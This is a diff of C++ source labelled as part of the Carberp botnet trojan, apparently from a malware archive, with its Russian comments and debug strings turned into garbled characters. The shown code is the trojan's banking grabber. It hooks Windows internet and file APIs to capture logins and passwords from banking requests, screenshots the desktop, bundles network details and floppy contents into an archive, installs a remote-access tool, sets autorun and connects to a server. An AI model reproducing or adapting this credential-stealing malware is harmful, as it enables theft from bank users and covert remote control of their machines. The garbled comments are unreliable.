@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 
 #include "Modules.h"
 
@@ -19,7 +30,7 @@ namespace BSSBGTEMPLATES
 	#include "DbgTemplates.h"
 }
 
-// Объявляем шаблон вывода отладочных строк
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 #define BSSDBG BSSBGTEMPLATES::DBGOutMessage<>
 
 
@@ -50,7 +61,7 @@ bool     HookBSSCreateFileWOnce = false;
 //-----------------------------------------------------------------------------
 void ClearBSSLog()
 {
-	// Очищаем структуру лога
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	if (BSSLog)
 	{
 		pDeleteFileA(BSSLog->Path);
@@ -65,7 +76,7 @@ void ClearBSSLog()
 
 bool InitializeBSS()
 {
-	// Инициализируем BSS грабер
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ BSS пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (IsNewProcess(BSSGrabberPID))
 	{
@@ -78,7 +89,7 @@ bool InitializeBSS()
 
 	BSSLog = CreateStruct(TBSSLog);
 
-	// Создаём CAB архив
+	// пїЅпїЅпїЅпїЅпїЅпїЅ CAB пїЅпїЅпїЅпїЅпїЅ
 	bool Initialized = false;
 	if (BSSLog)
 	{		
@@ -127,7 +138,7 @@ HANDLE WINAPI HOOK_BSSCreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DW
 
 	if (!BSSLog) return hRet;
 
-    // Проверяем формат файла
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (IsBSSFileFormat( (WCHAR*)lpFileName ) && BSSLog->Form )
 	{
 		WCHAR FileName[ MAX_PATH ];
@@ -208,7 +219,7 @@ void HookBSSCreateFileW()
 {
 	if (!BSSHooksInitialized)
 	{
-		BSSDBG("BSS", "Инициализируем хуки создания файлов");
+		BSSDBG("BSS", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");
 		const DWORD HASH_CreateFileW = 0x8F8F102;
 		if ( HookApi( DLL_KERNEL32, HASH_CreateFileW, &HOOK_BSSCreateFileW ) )
 		{
@@ -243,7 +254,7 @@ void GetBSSInfo( HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite
 					PCHAR Password	= GetTextBetween(Tmp,  "<P>", "</P>" );
 					if ( Login != NULL && Password != NULL)
 					{
-						BSSDBG("BSS", "Перехвачен запрос");
+						BSSDBG("BSS", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");
 
 						HINTERNET hParent;
 						DWORD dwSize = sizeof( HINTERNET );
@@ -262,19 +273,19 @@ void GetBSSInfo( HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite
 						}
 
 
-                        // Создаём лог
+                        // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 						string Log;
 						Log.Format(GetStr(BSSLogTemplate).t_str(), Url, Login, Password, UserAgent);
 
-						// Записываем данные в файл
+						// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ
 
 						if (InitializeBSS())
 						{
-							// Добавляем лог
+							// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 							AddStringToCab(BSSLog->hCab, Log, GetStr(StrLogFileTextData));
 							BSSLog->Form = true;
 
-							// Добавляем скриншот
+							// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 							PCHAR ScreenFile = File::GetTempNameA();
 
 							if (ScreenShot::CaptureScreenA(ScreenFile))
@@ -283,7 +294,7 @@ void GetBSSInfo( HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite
 							STR::Free(ScreenFile);
 
 
-							// Добавляем информацию о конфигурации сети
+							// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 							PCHAR NetFile = GetNetInfo();
 
 							if (NetFile)
@@ -293,19 +304,19 @@ void GetBSSInfo( HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite
 							}
 							STR::Free(NetFile);
 
-							// Добавляем содержимое флопика
+							// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 							pSetErrorMode( SEM_FAILCRITICALERRORS );
 							if (AddDirToCab( BSSLog->hCab, "A:", "Floppy" ))
 								BSSLog->bFloppy = true;
 
 
-							// Ставим хуки на доступ к файлам, для перехвата
-							// ключей
+							// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+							// пїЅпїЅпїЅпїЅпїЅпїЅ
                             HookBSSCreateFileW();
 							#ifdef AmmyyH
 								Ammyy::Install(false);
 							#endif 
-							VideoProcess::SetAutorun(true); //после ребута сконектиться с сервером
+							VideoProcess::SetAutorun(true); //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 							VideoProcess::ConnectToServer(0);
 						}
 					}
@@ -320,7 +331,7 @@ void GetBSSInfo( HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite
 	if ( BSSLog != NULL  && BSSLog->dwEntry )
 	{
 		//UnhookCreateFileW();
-        BSSDBG("BSS", "Отправляем лог BSS грабера");
+        BSSDBG("BSS", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ BSS пїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 		if ( !BSSLog->bFloppy )
 		{
 			pSetErrorMode( SEM_FAILCRITICALERRORS ); 
@@ -363,7 +374,7 @@ void BSSHooks()
 			__asm mov [REAL_BSSInternetWriteFile], eax
 		}
 
-		BSSDBG("BSS", "BSS грабер инициализирован");
+		BSSDBG("BSS", "BSS пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 	}
 }
 
